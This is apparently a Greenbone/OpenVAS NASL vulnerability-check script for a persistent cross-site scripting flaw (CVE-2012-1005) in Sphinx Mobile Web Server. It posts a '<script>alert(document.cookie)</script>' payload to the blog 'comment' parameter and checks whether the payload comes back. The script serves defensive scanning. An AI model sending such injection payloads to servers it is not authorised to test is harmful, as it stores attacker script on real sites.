if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802390" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-1005" );
	script_bugtraq_id( 51820 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-02-02 14:49:35 +0530 (Thu, 02 Feb 2012)" );
	script_name( "Sphinx Mobile Web Server 'comment' Multiple Cross-Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=453" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47876" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/72913" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18451/" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SecPod_SPHINX_SOFT_Mobile_Web_Server_Mul_Persistence_XSS_Vulns.txt" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "MobileWebServer/banner" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site." );
	script_tag( name: "affected", value: "Sphinx Mobile Web Server U3 3.1.2.47 and prior." );
	script_tag( name: "insight", value: "The flaws are due to an improper validation of user-supplied input
  via the 'comment' parameter to '/Blog/MyFirstBlog.txt' and
  '/Blog/AboutSomething.txt', which allows attacker to execute arbitrary HTML
  and script code on the user's browser session in the security context of an
  affected site." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Sphinx Mobile Web Server and is prone to
  persistent cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
mwsPort = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: mwsPort );
if(!ContainsString( banner, "Server: MobileWebServer/" )){
	exit( 0 );
}
pages = make_list( "/MyFirstBlog.txt",
	 "/AboutSomething.txt" );
for page in pages {
	url1 = "/Blog" + page + "?comment=<script>alert(document.cookie)" + "</script>&submit=Add+Comment";
	sndReq = http_get( item: url1, port: mwsPort );
	http_keepalive_send_recv( port: mwsPort, data: sndReq );
	url2 = "/Blog" + page;
	if(http_vuln_check( port: mwsPort, url: url2, pattern: "<script>alert" + "\\(document.cookie\\)</script>", check_header: TRUE )){
		report = http_report_vuln_url( port: mwsPort, url: url2 );
		security_message( port: mwsPort, data: report );
		exit( 0 );
	}
}
exit( 99 );

